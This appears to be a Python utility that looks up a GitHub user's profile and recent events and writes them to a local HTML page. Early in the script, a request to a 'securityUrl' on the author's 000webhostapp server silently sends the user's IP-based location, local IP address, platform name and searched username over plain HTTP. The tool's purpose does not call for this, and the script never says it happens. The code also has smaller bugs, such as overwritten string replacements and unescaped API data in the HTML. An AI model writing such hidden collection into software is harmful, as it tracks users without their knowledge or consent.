from pstats import Stats
import requests
import os
import platform
import colorama
from colorama import Fore, Back, Style
import socket
import sys
import geocoder
import json

g = geocoder.ip('me')

location = g.latlng
IP_Address = socket.gethostbyname(socket.gethostname())
pc_name = platform.platform()


class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'


if platform.system() == "Windows":
    os.system("cls")
else:
    os.system("clear")



introText = '''
  ____ _ _   _   _       _       _   _                 ____        _
 / ___(_) |_| | | |_   _| |__   | | | |___  ___ _ __  |  _ \  __ _| |_ __ _
| |  _| | __| |_| | | | | '_ \  | | | / __|/ _ \ '__| | | | |/ _` | __/ _` |
| |_| | | |_|  _  | |_| | |_) | | |_| \__ \  __/ |    | |_| | (_| | || (_| |
 \____|_|\__|_| |_|\__,_|_.__/   \___/|___/\___|_|    |____/ \__,_|\__\__,_|

	'''
developerText = '''
Tip: Don't Type "Quantum Byte Studios"\n\nCreated BY: @QuantumByteStudios\nWebsite: https://quantumbyteofficial.tech/
'''
sepText = "\n**************************************\n"


print(f"{bcolors.OKGREEN + introText + bcolors.ENDC}")
print(f"{bcolors.OKCYAN + developerText + bcolors.ENDC}")
print(f"{bcolors.FAIL + sepText + bcolors.ENDC}")
print("IP Address of your computer is : ", IP_Address)
print("Your computer name is : ", pc_name)
print("Your location is : ", location)
print(f"{bcolors.FAIL + sepText + bcolors.ENDC}")
username = input("Enter Github User Name: ")
print(f"{bcolors.FAIL + sepText + bcolors.ENDC}")
securityUrl = (
    f"http://quantumbyteofficial.000webhostapp.com/QuantumDrive/GitHubDataExtracter/index.php?Loaction={location},IP={IP_Address},PCName={pc_name},Searched={username}")
r = requests.get(securityUrl)
username = username.lower()

print(f"Fetching Data From API For User: {bcolors.FAIL + username + bcolors.ENDC}")
if username == "quantumbytestudios":
    print(Fore.RED + '\n\n\tBite the hand that feeds you... :( \n\n')

else:

    url = "https://api.github.com/users/"+username
    r = requests.get(url)
    r = r.text
    data = r.replace("\"", " ")
    data = r.replace("}", " ")
    data = r.replace(",", "\n")
    data1 = data.replace("\"", " ")
    data2 = data1.replace("{", "")
    data3 = data2.replace("}", "")

    print(f"{bcolors.WARNING + data3 + bcolors.ENDC}")

    username = username.lower()

    print("\n\nNow Available in Received Events")

    print("\n Most Used Languages: ")
    mostUsedLanguages = "\t"+"https://github-readme-stats.vercel.app/api/top-langs?username=" + \
        username+"&langs_count=8"
    print(f"{bcolors.OKBLUE + mostUsedLanguages + bcolors.ENDC}")

    print("\n GitHub Stats: ")
    githubStats = "\t"+"https://github-readme-stats.vercel.app/api?username=" + \
        username+"&show_icons=true&locale=en"
    print(f"{bcolors.OKBLUE + githubStats + bcolors.ENDC}")

    print("\n Current Streak, Total Contributions, Longest Streak: ")
    streakContributionsLS = "\t"+"https://github-readme-streak-stats.herokuapp.com/?user="+username+"&"
    print(f"{bcolors.OKBLUE + streakContributionsLS + bcolors.ENDC}")

    print("\n Contribution Graph: ")
    contributionGraph = "\t"+"https://activity-graph.herokuapp.com/graph?username="+username+"&theme=github"
    print(f"{bcolors.OKBLUE + contributionGraph + bcolors.ENDC}")
    print("\n")

    print(f"{bcolors.FAIL + sepText + bcolors.ENDC}")

    eventsurl = "https://api.github.com/users/"+username+"/received_events"
    print(f"{bcolors.OKCYAN}\tEVENTS GENERATED\n\n\t\tFrom: {eventsurl}\n\t\tAT: Data/ReceivedEvents/index.html{bcolors.ENDC}")
    ##################################################
    os.remove("Data/ReceivedEvents/index.html")

    r = requests.get(eventsurl)
    data = json.loads(r.text)
    START = 0
    END = len(data)
    f = open("Data/ReceivedEvents/index.html", "a")

    stylesheet = '''
	<head>
        <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-1BmE4kWBq78iYhFldvKuhfTAU6auU8tT94WrHftjDbrCEXSU1oBoqyl2QvZ6jIW3" crossorigin="anonymous">
    	<link rel="stylesheet" type="text/css" href="style.css">
	</head>
    <center>
        <a href="https://github.com/QuantumByteStudios"><h1>QuantumByteStudios</h1></a>
    </center>
    '''
    f.write(stylesheet)

    for i in range(START, END):
        # print(sep)
        # BASIC INFO
        ID = data[i]["id"]
        LOGIN = data[i]["actor"]["login"]
        AVATAR = data[i]["actor"]["avatar_url"]
        EVENT = data[i]["type"]
        # print("ID: "+ID)
        # print("LOGIN: "+LOGIN)
        # print("AVATAR: "+AVATAR)
        # print("EVENT: "+EVENT)
        event = data[i]["type"]

        if("ForkEvent" in event):
            # print("ORIGINAL REPO NAME: "+data[i]["repo"]["name"])
            # print("USER'S REPO NAME: "+data[i]["payload"]["forkee"]["full_name"])
            # print("USER'S REPO URL: "+data[i]["payload"]["forkee"]["html_url"])
            forkedRepoUrl = data[i]["payload"]["forkee"]["html_url"]
            html = f'''
            <div class="card">
                <div class="row">
                    <div class="col-2">
                        <img src="{AVATAR}" class="img-fluid profilePicture" alt="ProfilePicture">
                    </div>
                    <div class="col-10">
                        <a href="https://github.com/{LOGIN}"><p>{LOGIN}</p></a>
                        <p class="fork">Forked a repository: <a target="_blank" href="{forkedRepoUrl}">Visit Repository</a></p>
                    </div>
                </div>
            </div>
            '''
            f.write(html)

        if("WatchEvent" in event):
            # print("ORIGINAL REPO NAME: "+data[i]["repo"]["name"])
            # print("USER'S ACTION: "+data[i]["payload"]["action"])
            repoName = "https://github.com/"+data[i]["repo"]["name"]
            html = f'''
            <div class="card">
                <div class="row">
                    <div class="col-2">
                        <img src="{AVATAR}" class="img-fluid profilePicture" alt="ProfilePicture">
                    </div>
                    <div class="col-10">
                        <a href="https://github.com/{LOGIN}"><p>{LOGIN}</p></a>
                        <p class="watch-star">Watch/Starred a repository: <a target="_blank" href="{repoName}">Visit Repository</a></p>
                    </div>
                </div>
            </div>
            '''
            f.write(html)

        if("CreateEvent" in event):
            userRepoUrl = "https://github.com/"+data[i]["repo"]["name"]
            # print("ORIGINAL REPO NAME: "+data[i]["repo"]["name"])
            # print("USER'S REPO URL: "+userRepoUrl)
            html = f'''
            <div class="card">
                <div class="row">
                    <div class="col-2">
                        <img src="{AVATAR}" class="img-fluid profilePicture" alt="ProfilePicture">
                    </div>
                    <div class="col-10">
                        <a href="https://github.com/{LOGIN}"><p>{LOGIN}</p></a>
                        <p class="create">Created a repository: <a target="_blank" href="{userRepoUrl}">Visit Repository</a></p>
                    </div>
                </div>
            </div>
            '''
            f.write(html)

        if("PublicEvent" in event):
            userRepoUrl = "https://github.com/"+data[i]["repo"]["name"]
            # print("PUBLISHED REPO URL: "+userRepoUrl)
            html = f'''
            <div class="card">
                <div class="row">
                    <div class="col-2">
                        <img src="{AVATAR}" class="img-fluid profilePicture" alt="ProfilePicture">
                    </div>
                    <div class="col-10">
                        <a href="https://github.com/{LOGIN}"><p>{LOGIN}</p></a>
                        <p class="publish">Published a repository: <a target="_blank" href="{userRepoUrl}">Visit Repository</a></p>
                    </div>
                </div>
            </div>
            '''
            f.write(html)

        if("ReleaseEvent" in event):
            userRepoUrl = data[i]["payload"]["release"]["html_url"]
            # print("RELEASED REPO URL: "+userRepoUrl)
            html = f'''
            <div class="card">
                <div class="row">
                    <div class="col-2">
                        <img src="{AVATAR}" class="img-fluid profilePicture" alt="ProfilePicture">
                    </div>
                    <div class="col-10">
                        <a href="https://github.com/{LOGIN}"><p>{LOGIN}</p></a>
                        <p class="release">Released a repository: <a target="_blank" href="{userRepoUrl}">Visit Repository</a></p>
                    </div>
                </div>
            </div>
            '''
            f.write(html)

    userStats = f'''
    <br>
    <div class="container stats">
        <div class="row">
            <div class="col-6">
                <img src="{mostUsedLanguages}" alt="GitHubUserDataExtracter"><br>
            </div>
            <div class="col-6">
                <img src="{githubStats}" alt="GitHubUserDataExtracter">
                <img src="{streakContributionsLS}" alt="GitHubUserDataExtracter"><br>
            </div>
            &nbsp;
            <img src="{contributionGraph}" alt="GitHubUserDataExtracter"><br>
        </div><br>
    </div>
    '''
    f.write(userStats)

    f.close()

    if platform.system() == "Windows":
        os.system('start Data/ReceivedEvents/index.html')
    else:
        os.system("open Data/ReceivedEvents/index.html")

    garbage = input("Press any key to exit...")
